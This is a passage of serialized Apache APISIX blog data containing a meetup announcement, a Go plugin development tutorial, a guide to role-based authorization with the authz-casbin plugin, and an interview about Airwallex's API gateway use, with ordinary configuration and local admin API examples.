grids.\\n\\n[**View**](/articles/How-To-Extend-Apache-APISIX-into-a-Service-Mesh-Sidecar)\\n\\n## The Evolution of Apache APISIX\\n\\nShared by: Zexuan Luo\\n\\nIn this topic, I will introduce the evolution of Apache APISIX, including: 1. The good decisions we made; 2. The bad decisions we made; 3. Our future plans\\n\\n[**View**](/articles/The-Evolution-of-Apache-APISIX)\\n\\n## Implementation of Kubernetes Ingress based on Apache APISIX\\n\\nShared by: Wei Jin\\n\\nIntroducing the advantages of Apache APISIX-based Kubernetes Ingress and the features of Apache APISIX Ingress.\\n\\n[**View**](/articles/Apache-APISIX-Kubernetes-Ingress)\\n\\n## Apache APISIX\'s Incubator Journey\\n\\nShared by: Ming Wen\\n\\nThe Incubator Journey of Apache APISIX\\n\\n[**View**](/articles/Apache-APISIX-Incubator-Journey)"},{"id":"Apache APISIX Meetup in Shanghai, welcome to register!","metadata":{"permalink":"/blog/2021/08/21/shanghai-meetup","source":"@site/blog/2021/08/21/shanghai-meetup.md","title":"Apache APISIX Meetup in Shanghai, welcome to register!","description":"This meetup will share with you the origin of the API gateway Apache APISIX community, iQIYI\'s user cases and how to implement centralized authentication on APISIX.","date":"2021-08-21T00:00:00.000Z","formattedDate":"August 21, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.285,"truncated":true,"authors":[],"prevItem":{"title":"ApacheCon Asia 2021","permalink":"/blog/2021/08/23/apachecon-asia-2021"},"nextItem":{"title":"How to use Go to develop Apache APISIX plugin","permalink":"/blog/2021/08/19/go-makes-apache-apisix-better"}},"content":"> This Meetup is initiated by [api7.ai](https://www.apiseven.com/), and invited partners such as iQiYi and Airwallex to present it. Apache APISIX PMC members, contributors, and community technical experts gathered to discuss Apache APISIX community development, industry practices, and other topics.\\n\\n\x3c!--truncate--\x3e\\n\\n#### Time: August 21, 2021, 13:30\\n\\n#### Location: Jinghe Island II, 6th Floor, Central Plaza, Huangpu District, Shanghai\\n\\n#### By attending this Meetup, you can\\n\\n- Discuss the past and present of the Apache APISIX community\\n- Hear from Akiyo scientists about how Akiyo uses Apache APISIX to support a service with 10 million calls\\n- How Airwallex uses Apache APISIX to balance user experience, clean architecture and data sovereignty\\n- Learn about the benefits of centralized authentication and how to do it on APISIX\\n\\nIf you\'re interested, don\'t miss it, **scan the event poster for QR code to register!**\\n\\nTips: We will control the size of the event as the epidemic is not relaxed, so registration is limited.\\n\\n## Event Schedule\\n\\n![Apache APISIX Meetup](https://static.apiseven.com/202108/1639467909853-fd9caa2e-8b45-459c-8bb7-8acb4a20692e.jpg)\\n\\n## Introduction to the topic\\n\\n### Apache APISIX based, iQiYi API gateway implementation practice\\n\\n#### Sharing Guests\\n\\nWenjie Jiang / Scientist, iQiYi\\n\\n#### Topic Details\\n\\nAPI gateway has become an indispensable part of microservice architecture. It is the only portal for services to the outside world, but also needs to meet the common functions of many applications. As an online video company, Aqiyi needs to carry tens of millions of calls every day and has extremely strict requirements for data security, user request response time, and system stability, so the company needs to build a high-performance and highly available API gateway. This article briefly introduces the architecture of iQiYi API gateway and the functions implemented, including request distribution, conditional routing, API management, flow-limiting fusion, security triple prevention, monitoring and alarming, and full-link tracking.\\n\\n### How to use Apache APISIX for centralized authentication\\n\\n#### Sharing Guests\\n\\nXinxin Zhu / api7.ai Engineer, Apache APISIX Committer\\n\\n#### Topic Details\\n\\nAuthentication is a very important part of zero-trust architecture. APISIX is a dynamic, real-time, high-performance API gateway that supports a rich set of authentication plugins.\\n\\n### Data Sovereignty and Apache APISIX Gateway Landing Practice\\n\\n#### Sharing Guests\\n\\nYang Li / Head of Airwallex Technology Platform\\n\\n#### Topic Details\\n\\nData is everywhere, and massive amounts of data are being processed, transmitted, and stored all over the world every moment. However, the world of data is not a place outside the law, and the collection and processing of data must comply with the laws of each country. The API gateway has a special position in the enterprise architecture and therefore plays a special role in the data sovereignty scenario.\\n\\n### The One Who Walks Alone Goes Fast, The Many Who Walk Far, Apache APISIX Thanks to You\\n\\n#### Sharing Guests\\n\\nYansheng Wang / Co-founder & CTO of api7.ai\\n\\n#### Topic Details\\n\\nApache APISIX has been growing as a community since the first day of open source. In just two years, the product has won the first place in many technical indicators and quickly become the most active API gateway project in the world, and has defined the path that belongs to Apache APISIX: unified 7-layer traffic processing. One person can go fast, but a group of people can go farther, and we are grateful to you for the growth of Apache APISIX.\\n\\n## Peripheral Benefits\\n\\nJoin the Meetup, interact with the instructors, and get a chance to win the latest Apache APISIX gifts: mouse pads, coffee mugs, Apache APISIX badges, and umbrellas.\\n\\n![Apache APISIX Gift](https://static.apiseven.com/202108/1639468073361-021ba09a-69bb-47ac-a852-e879c3109a9a.jpg)\\n\\n## How to participate\\n\\n### On-site registration\\n\\nScan the event poster QR code above to sign up!\\n\\n### Online Live Streaming\\n\\nIf you can\'t make it to the Meetup, follow the Apache APISIX video to watch the live stream.\\n\\n![Apache APISIX Live](https://static.apiseven.com/202108/1639467967121-2fff2f38-7949-4ea5-be55-7a3bf47b2bd5.png)\\n\\n## Join the group to communicate\\n\\nFollow the Apache APISIX public page and reply with the keyword \\"Shanghai\\" in the background to join the Apache APISIX Shanghai group.\\n\\n![Apache APISIX wechat](https://static.apiseven.com/202108/1639468019348-d2d555ab-e860-41a4-9efa-f383eb0c0069.png)"},{"id":"2021/08/19/go-makes-apache-apisix-better","metadata":{"permalink":"/blog/2021/08/19/go-makes-apache-apisix-better","source":"@site/blog/2021/08/19/go-makes-Apache-APISIX-better.md","title":"How to use Go to develop Apache APISIX plugin","description":"This article explains in detail how to use Go to develop the plug-in and specific operation steps of the cloud native API gateway Apache APISIX.","date":"2021-08-19T00:00:00.000Z","formattedDate":"August 19, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":5.62,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Apache APISIX Meetup in Shanghai, welcome to register!","permalink":"/blog/2021/08/21/shanghai-meetup"},"nextItem":{"title":"Licensing with Casbin in Apache APISIX","permalink":"/blog/2021/08/18/auth-with-casbin-in-apache-apisix"}},"content":"> This article will explain in detail how to use Go to develop Apache APISIX plugins. By embracing the Go ecosystem and breaking new ground for Apache APISIX, we hope that Go will make Apache APISIX even better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Why Go\\n\\n[Apache APISIX](https://github.com/apache/apisix) allows users to extend functionality by way of plugins. Core features such as authentication, flow restriction, request rewriting, etc. are implemented by way of plugins. Although the core code of Apache APISIX is written in Lua, Apache APISIX supports multi-language development of plugins, such as Go, Java.\\n\\nThis article will explain in detail how to develop Apache APISIX plugins in Go. By embracing the Go ecosystem, we are breaking new ground for Apache APISIX, and we hope that Go will make Apache APISIX even better!\\n\\n## Installation\\n\\nTo use Go Runner as a library, the official `cmd/go-runner` example in [apisix-go-plugin-runner](https://github.com/apache/apisix-go-plugin-runner) shows how to use the Go Runner SDK. The Go Runner SDK will also support loading pre-compiled plugins via the Go Plugin mechanism in the future.\\n\\n## Development\\n\\n### Developing with the Go Runner SDK\\n\\n```bash\\n$ tree cmd/go-runner\\ncmd/go-runner\\n\u251c\u2500\u2500 main.go\\n\u251c\u2500\u2500 main_test.go\\n\u251c\u2500\u2500 plugins\\n\u2502   \u251c\u2500\u2500 say.go\\n\u2502   \u2514\u2500\u2500 say_test.go\\n\u2514\u2500\u2500 version.go\\n```\\n\\nAbove is the directory structure of the official example. `main.go` is the entry point, where the most critical part is.\\n\\n```go\\ncfg := runner.RunnerConfig{}\\n...\\nrunner.Run(cfg)\\n```\\n\\n`RunnerConfig` can be used to control the log level and log output location.\\n\\n`runner.Run` will make the application listen to the target location, receive requests and execute the registered plugins. The application will remain in this state until it exits.\\n\\nOpen `plugins/say.go`.\\n\\n```go\\nfunc init() {\\n  err := plugin.RegisterPlugin(&Say{})\\n  if err != nil {\\n    log.Fatalf(\\"failed to register plugin say: %s\\", err)\\n  }\\n}\\n```\\n\\nSince `main.go` imports the plugins package, the\\n\\n```go\\nimport (\\n  ...\\n  _ \\"github.com/apache/apisix-go-plugin-runner/cmd/go-runner/plugins\\"\\n  ...\\n)\\n```\\n\\nThis registers `Say` with `plugin.RegisterPlugin` before executing `runner.Run`.\\n\\n`Say` needs to implement the following methods.\\n\\nThe `Name` method returns the plugin name.\\n\\n```go\\nfunc (p *Say) Name() string {\\n  return \\"say\\"\\n}\\n```\\n\\n`ParseConf` will be called when the plugin configuration changes, parsing the configuration and returning a plugin-specific configuration context.\\n\\n```go\\nfunc (p *Say) ParseConf(in []byte) (interface{}, error) {\\n  conf := SayConf{}\\n  err := json.Unmarshal(in, &conf)\\n  return conf, err\\n}\\n```\\n\\nThe context of the plugin looks like this.\\n\\n```go\\ntype SayConf struct {\\n  Body string `json:\\"body\\"`\\n}\\n```\\n\\n`Filter` is executed on every request with the say plugin configured.\\n\\n```go\\nfunc (p *Say) Filter(conf interface{}, w http.ResponseWriter, r pkgHTTP.Request) {\\n  body := conf.(SayConf).Body\\n  if len(body) == 0 {\\n    return\\n  }\\n\\n  w.Header().Add(\\"X-Resp-A6-Runner\\", \\"Go\\")\\n  _, err := w.Write([]byte(body))\\n  if err != nil {\\n    log.Errorf(\\"failed to write: %s\\", err)\\n  }\\n}\\n```\\n\\nYou can see that Filter takes the value of the body inside the configuration as the response body. If the response is made directly in the plugin, it will break the request.\\n\\nGo Runner SDK API documentation: https://pkg.go.dev/github.com/apache/apisix-go-plugin-runner\\n\\nAfter building the application (`make build` in the example), you need to set two environment variables at runtime.\\n\\n1. `APISIX_LISTEN_ADDRESS=unix:/tmp/runner.sock`\\n2. `APISIX_CONF_EXPIRE_TIME=3600`\\n\\nLike this:\\n\\n```go\\nAPISIX_LISTEN_ADDRESS=unix:/tmp/runner.sock APISIX_CONF_EXPIRE_TIME=3600 ./go-runner run\\n```\\n\\nThe application will listen to `/tmp/runner.sock` when it runs.\\n\\n### Setting up Apache APISIX (development)\\n\\nThe first step is to install Apache APISIX, which needs to be on the same instance as Go Runner.\\n\\n![Apache APISIX work flow](https://static.apiseven.com/202108/1639467846997-8be8195d-98ac-457d-8b7f-a7b78e55fef1.png)\\n\\nThe above diagram shows the workflow of Apache APISIX on the left, and the plugin runner on the right is responsible for running external plugins written in different languages. apisix-go-plugin-runner is such a runner that supports the Go language.\\n\\nWhen you configure a plugin runner in Apache APISIX, Apache APISIX treats the plugin runner as a child of itself, which belongs to the same user as the Apache APISIX process, and when we restart or reload Apache APISIX, the plugin runner will be restarted as well.\\n\\nIf the ext-plugin-* plugin is configured for a given route, a request to hit that route will trigger Apache APISIX to make an RPC call to the plugin runner over a unix socket. The call is broken down into two phases.\\n\\n- ext-plugin-pre-req: before executing most of the Apache APISIX built-in plugins (Lua language plugins)\\n- ext-plugin-post-req: after the execution of the Apache APISIX built-in plugins (Lua language plugins)\\n\\nConfigure the timing of plugin runner execution as needed.\\n\\nThe plugin runner processes the RPC call, creates a simulated request inside it, then runs the plugins written in other languages and returns the results to Apache APISIX.\\n\\nThe order of execution of these plugins is defined in the ext-plugin-* plugin configuration entry. Like other plugins, they can be enabled and redefined on the fly.\\n\\nTo show how to develop Go plugins, we first set up Apache APISIX to enter development mode. Add the following configuration to config.yaml.\\n\\n```shell\\next-plugin:\\n  path_for_test: /tmp/runner.sock\\n```\\n\\nThis configuration means that after the routing rule is hit, Apache APISIX will make an RPC request to /tmp/runner.sock.\\n\\nNext, set up the routing rules.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\": \\"/get\\",\\n  \\"plugins\\": {\\n    \\"ext-plugin-pre-req\\": {\\n      \\"conf\\": [\\n        {\\"name\\":\\"say\\", \\"value\\":\\"{\\\\\\"body\\\\\\":\\\\\\"hello\\\\\\"}\\"}\\n      ]\\n    }\\n  },\\n  \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\\n\'\\n```\\n\\nNote that the plugin name is configured in `name` and the plugin configuration (after JSON serialization) is placed in `value`.\\n\\nIf you see `refresh cache and try again` warning on Apache APISIX side and `key not found` warning on Runner side during development, this is due to configuration cache inconsistency. Since the Runner is not managed by Apache APISIX in the development state, the internal state may be inconsistent. Don\'t worry, Apache APISIX will retry.\\n\\nThen we request: curl 127.0.0.1:9080/get\\n\\n```shell\\n$ curl http://127.0.0.1:9080/get\\nHTTP/1.1 200 OK\\nDate: Mon, 26 Jul 2021 11:16:11 GMT\\nContent-Type: text/plain; charset=utf-8\\nTransfer-Encoding: chunked\\nConnection: keep-alive\\nX-Resp-A6-Runner: Go\\nServer: APISIX/2.7\\n\\nhello\\n```\\n\\nYou can see that the interface returns hello and does not access any upstream.\\n\\n### Setting up Apache APISIX (run)\\n\\nHere is an example of go-runner, which can be run by simply configuring the run command line in ext-plugin: the\\n\\n```shell\\next-plugin:\\n  # path_for_test: /tmp/runner.sock\\n  cmd: [\\"/path/to/apisix-go-plugin-runner/go-runner\\", \\"run\\"]\\n```\\n\\nApache APISIX will treat the plugin runner as a child process of its own, managing its entire lifecycle.\\n\\nNote: Do not configure path_for_test at this point. Apache APISIX automatically assigns a unix socket address for the runner to listen to when it starts. You don\'t need to set them manually.\\n\\n## Summary\\n\\nGo Plugin Runner is still in the early stages of development, we will continue to improve its functionality. We welcome you to participate in the development of apisix-go-plugin-runner, and let\'s build a bridge between Apache APISIX and Go together!\\nClick to visit [apisix-go-plugin-runner](https://github.com/apache/apisix-go-plugin-runner).\\n\\n## Related reading\\n\\n[How to write Apache APISIX plugins in Java](https://apisix.apache.org/blog/2021/06/21/use-Java-to-write-Apache-APISIX-plugins)"},{"id":"2021/08/18/auth-with-casbin-in-apache-apisix","metadata":{"permalink":"/blog/2021/08/18/auth-with-casbin-in-apache-apisix","source":"@site/blog/2021/08/18/Auth-with-Casbin-in-Apache-APISIX.md","title":"Licensing with Casbin in Apache APISIX","description":"When we are using API Gateway Apache APISIX, we may need to add complex authorization logic. we can implement RBAC using APISIX\'s built-in Casbin plugin (authz-casbin).","date":"2021-08-18T00:00:00.000Z","formattedDate":"August 18, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":5.415,"truncated":true,"authors":[{"name":"Casbin & Apache APISIX"}],"prevItem":{"title":"How to use Go to develop Apache APISIX plugin","permalink":"/blog/2021/08/19/go-makes-apache-apisix-better"},"nextItem":{"title":"Interview with Yang to explore API gateway in Airwallex","permalink":"/blog/2021/08/17/interview-airwallex"}},"content":"> When we are using Apache APISIX, we may want to add complex authorization logic to our application. In this post, we will use the built-in Casbin plugin (authz-casbin) for Apache APISIX to implement a role-based access control (RBAC) model.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\n### Apache APISIX\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a dynamic, real-time, high-performance API gateway that provides load balancing, dynamic upstream, canary release, fine-grained routing, flow and speed limiting, service degradation, service meltdown, authentication, observability, and hundreds of other features. You can use Apache APISIX for traditional north-south traffic, as well as east-west traffic between services, or as a [k8s ingress controller](https://github.com/apache/apisix-ingress-controller).\\n\\n### Casbin\\n\\n[Casbin](https://casbin.org/zh-CN/) is a powerful and efficient open source access control framework with a permission management mechanism that supports multiple access control models.\\n\\n### authz-casbin plugin introduction\\n\\nIn the use of Apache APISIX, there is an implicit tension between route matching and request authorization: for higher granularity access control, higher granularity routes need to be configured to accurately identify requests and authorize them. In complex authorization model scenarios, this leads to an exponential increase in the number of routes, which increases the complexity of operations and maintenance.\\n[authz-casbin](https://github.com/apache/apisix/blob/d9b928321fcdd12eef024df8c7c410424c1e0c8b/docs/en/latest/plugins/authz-casbin.md) is a lua-casbin based Apache APISIX plugin that supports powerful authorization based on various access models. casbin is a powerful and efficient open source access control framework that supports ACL, RBAC, ABAC and other access control models. lua-casbin is a Lua version implementation of the Casbin access control framework.\\nThe authz-casbin plugin can decouple the two functions of route matching and request authorization very well. You can load various authorization access models into Apache APISIX and implement efficient and complex authorization models with the help of lua-casbin.\\n\\n**Note**: If you want to implement authentication, you need to use other plugins or configure yourself to complete the authentication of the user\'s identity, for example [jwt-auth](https://github.com/apache/apisix/blob/master/docs/zh/latest/plugins/jwt-auth.md) plugin.\\n\\n## authz-casbin Usage Guide\\n\\n### Create a model\\n\\nThe authz-casbin plugin uses three parameters for authorization: subject, object and action. subject is the user name, which refers to the user in the request; object is the URL link that will be accessed, i.e. the resource that will be accessed; action is the action that is requested for authorization, such as read or write. (write).\\nIf we want to create a model to access three resources: /, /res1, /res2, we want a model like this\\n\\n![authz-casbin example](https://static.apiseven.com/202108/1639467795044-8676c5cb-00e0-48e1-b7b1-929e37c87b75.png)\\n\\nIn this model, all users, such as Jack, have access to the main page (/). And users like Alice and Bob with admin rights have access to all pages and resources (/res1, /res2, /). Thus, we need to restrict users without administrator privileges to access specific resources using the GET request method. The required model is as follows.\\n\\n```shell\\n[request_definition]\\nr = sub, obj, act\\n\\n[policy_definition]\\np = sub, obj, act\\n\\n[role_definition]\\ng = _, _\\n\\n[policy_effect]\\ne = some(where (p.eft == allow))\\n\\n[matchers]\\nm = (g(r.sub, p.sub) || keyMatch(r.sub, p.sub)) && keyMatch(r.obj, p.obj) && keyMatch(r.act, p.act)\\n```\\n\\n### Create a policy\\n\\nFrom the above example, the policy should look like this.\\n\\n```shell\\np, *, /, GET\\np, admin, *, *\\ng, alice, admin\\ng, bob,admin\\n```\\n\\nThe matcher in the model indicates that.\\n\\n1. `(g(r.sub, p.sub) || keyMatch(r.sub, p.sub))`: The subject in the request and the subject in the policy have the same role or the subject in the request and the subject in the policy can be matched by the built-in method `keyMatch`. `keyMatch` is a built-in function of Lua Casbin, a description of which and more can be found at [lua-casbin](https://github.com/casbin/lua-casbin/blob/master/src/util/BuiltInFunctions.lua).\\n2. `keyMatch(r.obj, p.obj)`: the object in the request and the object in the policy can match each other (proxy for URL links).\\n3. `keyMatch(r.act, p.act)`: the action in the request and the action in the policy match each other (proxy for the HTTP request method).\\n\\n### Using plugins on routes\\n\\nOnce you have created a model and a policy, you can use it on a route using the APISIX Admin API. To use it, you can model and policy file paths to.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"authz-casbin\\": {\\n            \\"model_path\\": \\"/path/to/model.conf\\",\\n            \\"policy_path\\": \\"/path/to/policy.csv\\",\\n            \\"username\\": \\"user\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/*\\"\\n}\'\\n```\\n\\nIn this case, username is the username passed into the subject. For example, you can set `\\"username\\": \\"user\\"` to pass the `\\"user\\": \\"alice\\"` you defined to the username, making the username Alice.\\nSimilarly, you can put models and policies directly into\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"authz-casbin\\": {\\n            \\"model\\": \\"[request_definition]\\n            r = sub, obj, act\\n\\n            [policy_definition]\\n            p = sub, obj, act\\n\\n            [role_definition]\\n            g = _, _\\n\\n            [policy_effect]\\n            e = some(where (p.eft == allow))\\n\\n            [matchers]\\n            m = (g(r.sub, p.sub) || keyMatch(r.sub, p.sub)) && keyMatch(r.obj, p.obj) && keyMatch(r.act, p.act)\\",\\n\\n            \\"policy\\": \\"p, *, /, GET\\n            p, admin, *, *\\n            g, alice, admin\\",\\n\\n            \\"username\\": \\"user\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/*\\"\\n}\'\\n```\\n\\n### Using plugins with global models/policies\\n\\nIn some cases where you may want to use the same model and policy in multiple routes, you can first send a PUT request to send the model and policy configuration to the plugin\'s metadata at\\n\\n```shell\\ncurl <http://127.0.0.1:9080/apisix/admin/plugin_metadata/authz-casbin> -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -i -X PUT -d \'\\n{\\n\\"model\\": \\"[request_definition]\\nr = sub, obj, act\\n[policy_definition]\\np = sub, obj, act\\n[role_definition]\\ng = _, _\\n[policy_effect]\\ne = some(where (p.eft == allow))\\n[matchers]\\nm = (g(r.sub, p.sub) || keyMatch(r.sub, p.sub)) && keyMatch(r.obj, p.obj) && keyMatch(r.act, p.act)\\",\\n\\"policy\\": \\"p, *, /, GET\\np, admin, *, *\\ng, alice, admin\\ng, bob, admin\\"\\n}\'\\n```\\n\\nYou then need to use the Admin API to send a request to make multiple routes use the same model/policy configuration; the\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"authz-casbin\\": {\\n            \\"username\\": \\"user\\"\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/*\\"\\n}\'\\n```\\n\\nThis will add the plugin\'s configuration to the route dynamically. You can easily update the plugin\'s configuration by sending a request to update the model and policy in the plugin\'s configuration data.\\n\\n## Finally\\n\\nThanks to the developers of Casbin and Apache APISIX communities, from the Casbin community developers rushitote to raise issues and submit PRs, to the Apache APISIX community developers to actively review PRs, this cross-community collaboration is moving forward in a friendly and orderly way, responding to open source makes the world better.\\n\\nSource: [authorization-in-apisix-using-casbin](https://medium.com/@rushitote/authorization-in-apisix-using-casbin-59b693669d6d)"},{"id":"Interview with Yang to explore API gateway in Airwallex","metadata":{"permalink":"/blog/2021/08/17/interview-airwallex","source":"@site/blog/2021/08/17/interview-airwallex.md","title":"Interview with Yang to explore API gateway in Airwallex","description":"This article introduces why SkyCloud chooses API gateway Apache APISIX and the usage scenarios and production environment performance of APISIX.","date":"2021-08-17T00:00:00.000Z","formattedDate":"August 17, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.4,"truncated":true,"authors":[{"name":"Apache APISIX"}],"prevItem":{"title":"Licensing with Casbin in Apache APISIX","permalink":"/blog/2021/08/18/auth-with-casbin-in-apache-apisix"},"nextItem":{"title":"Using the Apache APISIX OpenID Connect Plugin for Okta Centralized Authentication","permalink":"/blog/2021/08/16/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication"}},"content":"> This article interviewed Airwallex Technical Platform Lead Yang Li, who is responsible for the evolution of the company\'s technology platform. The interview details why Airwallex chose Apache APISIX when making the technology selection, the usage scenarios of Apache APISIX in Airwallex, and the performance of Apache APISIX in the production environment.\\n\\n\x3c!--truncate--\x3e\\n\\nWe had a chance to interview Yang Li, the technical platform leader of Airwallex. In the interview, Yang Li talked about why he chose Apache APISIX in the technology selection, and the application of Apache APISIX in Airwallex.\\n\\n**Q: Hello Dr. Li, please briefly introduce yourself and the work you are currently engaged in.**\\n\\n**Yang**: Hi, my name is Yang Li, PhD, Apache APISIX Committer, Airwallex Technical Platform Lead, responsible for the evolution of the company\'s technology platform. Prior to joining Airwallex, I led the Ops Chain Alliance at Wanxiang Blockchain. Prior to Wanxiang Blockchain, he led the OTC derivatives risk control platform at Citigroup.\\n\\nAirwallex is a global financial technology company that empowers businesses of all sizes to operate across borders, thereby helping to grow the global economy. With technology at its core, Airwallex has built a proprietary global financial infrastructure platform with a global payment network covering more than 50 currencies in over 130 countries and regions, providing digital fintech products for businesses of all sizes to help them grow at high speed around the world in a more efficient and secure way in the globally connected information age. Since its inception in 2015, Airwallex has received over $500 million in funding from top-tier investors and now has 12 offices and over 900 employees worldwide.\\n\\n![Airwallex Li Yang](https://static.apiseven.com/202108/20210816001.png)\\n\\n**Q: What made you/your technical team choose to use Apache APISIX when making the technology selection?**\\n\\n**Yang**: API gateway is an extremely important basic technology component, and we compared the main gateway products in 6 main dimensions during the technology selection.\\n\\n- **Stability**: The stability of the API gateway is critical. 62.1% of the top 1000 websites in the world are Nginx-based, which means that the Nginx-based web server has been tested in complex and diverse scenarios in production environments; Apache APISIX\'s fully dynamic design also allows it to modify routes without having to reload, and the client\'s long links are maintained. The fully dynamic design of Apache APISIX also allows it to maintain long links to clients without having to reload when modifying routes; we also stress-tested Apache APISIX and found it to be stable when the CPU reached over 70%.\\n\\n- **Performance**: Every API request passes through the API gateway, and reducing gateway performance loss can greatly reduce the overall response time of the company\'s API. In our PoC comparison of the major gateway products, Apache APISIX has more than 50% lower response latency than other gateways; the design of the Apache APISIX data plane also makes each instance in the cluster independent of each other, which also makes it inherently support horizontal scaling.\\n\\n- **Scalability**: The API gateway model is a very important microservice architecture model, and API gateways that conform to the API gateway model must support complex enterprise features such as authentication, permission control, service discovery, flow restriction, degradation, load balancing, whitelisting, dynamic routing, etc. So what kind of customization is supported is a very critical consideration when choosing an API gateway.\\n\\n- **Community Activity**: New technologies and requirements are emerging all the time, and an active community is key for API gateways to keep pace with the evolution of technology. As early as when Apache APISIX was an Apache incubation project, its community was already very active, in terms of contributor count, issue response time, and Pull Request count.\\n\\n- **Private Deployment**: As a core technology architecture component, API gateways should be deployed at the edge of an enterprise\'s private network. Apache APISIX has good environmental adaptability and can be easily deployed on various environments, including cloud computing platforms.\\n\\n- **Open Source Protocol**: Apache 2.0 gives considerable technical freedom to enterprises that customize APISIX.\\n\\n**Q: What scenarios is Apache APISIX used in? What problems have been solved?**\\n\\n**Yang**: We use Apache APISIX as a core component of our microservice gateway model, which is deployed at the edge of the network to provide common gateway functionality for all traffic coming into Airwallex, solving problems such as\\n\\n- Data sovereignty issues: Data sovereignty is a very critical regulatory requirement for financial infrastructures that operate across borders. To this end, we developed a regulatory compliant dynamic routing plug-in using the Apache APISIX dynamic upstream selection feature. Dynamic routing can intelligently select upstreams for request distribution based on the characteristics of user requests, abstracting the complex multi-data center collaboration problem from the service layer to the gateway layer. Dynamic routing essentially has to answer two questions: How to group upstreams? How to match requests with groupings.\\n\\n- Microservice Isolation: Airwallex wants the engineering teams of each microservice to have autonomous control over their own services, effectively reducing the cost of communication and coordination and improving engineering effectiveness. This architectural concept requires that infrastructure components shared by teams, such as API Gateway, support multi-tenant isolation. While ensuring the robustness and cost control of the whole system, it allows business teams to configure and extend the gateway functions according to their own needs, maintaining the independence of microservice teams and services.\\n\\n- Tenant-level flow limit: In a multi-tenant environment, the traffic characteristics of each tenant are different. The same flow restriction for different tenants cannot meet the business needs, and tenant-level flow restriction can do more appropriate flow restriction based on user characteristics.\\n\\n- Tenant-level whitelisting: In a multi-tenant environment, each tenant\'s access IP is different. Single whitelist control cannot meet the needs of tenant-level security management. Tenant-level whitelisting allows each tenant to control its own whitelist and not worry about other users in the whitelist accessing its own resources.\\n\\n- Authentication: API gateways should not only support request authentication, but also support dynamic key update, which is a key part of ensuring the security of user resources.\\n\\n- The API gateway can verify whether the requesting user has sufficient authority to access the interface according to the routing configuration and intercept illegal traffic in the first place.\\n\\n![Airwallex arch](https://static.apiseven.com/202108/20210816002.png)\\n\\nIt\'s a bit more involved and can be simplified to make it clearer: !\\n\\n![Airwallex arch](https://static.apiseven.com/202108/20210816003.png)\\n\\n**Q:Did you have a smooth upgrade process in Apache APISIX? Share your feelings or stories about the upgrade process.**\\n\\nIn order to be able to upgrade to new versions of Apache APISIX at any time, we implemented the main features as custom plugins. This means that our code base is unlikely to conflict with the core Apache APISIX main Repo code, which helps us avoid code conflicts we might encounter. However, there are times when we need to modify the core code, at which point we try to implement these features in the open source community. When we discuss these features in the open source community, the community partners are very eager to participate in the discussion and in most cases solve our problems quickly.\\n\\n**Q: How long has Apache APISIX been running in a production environment? How does it perform online?**\\n\\n**Yang**: The production environment has been running for 15 months, and 99% of the response latency is within 23ms with dynamic routing, tenant-level flow restriction, tenant-level whitelisting, Authentication, Authorization, etc. The overall performance is very stable. Thanks to the excellent plug-in mechanism of Apache APISIX, we can add private plug-ins that meet business requirements with little modification to its core code. The complete testing system also further guarantees the quality of the software and allows us to add plug-ins for personalized requirements without breaking the original core logic.\\n\\n**Q: What are the shortcomings of Apache APISIX and what do you hope the community will build together to improve?**\\n\\n**Yang**: Apache APISIX\'s data-plane design brings it lossless horizontal scaling and extreme performance, but it also makes the routing configuration difficult to achieve forward compatibility, which brings some coordination difficulties for the release of new versions.\\n\\n**Q: What are the follow-up plans?**\\n\\n**Yang**: The follow-up plan includes three main areas.\\n\\n1. using multi-layer networks to split different gateway logic into different tiers, such as distributing traffic based on data sovereignty with other gateway logic belonging to a different network tier.\\n2. easy-to-read and easy-to-use route management is critical to the success or failure of the API gateway, although the gateway features will continue to iterate and increase, but the route management needs to be developer-friendly so that developers can easily understand what the gateway can do for him, how to configure and how to publish.\\n3. Use request staining to help implement production environment testing. Implementing production environment testing with API gateway request staining can bring us flexibility and ease of use.\\n\\nThank you, Dr. Li, and we look forward to more use cases and roles for Apache APISIX in 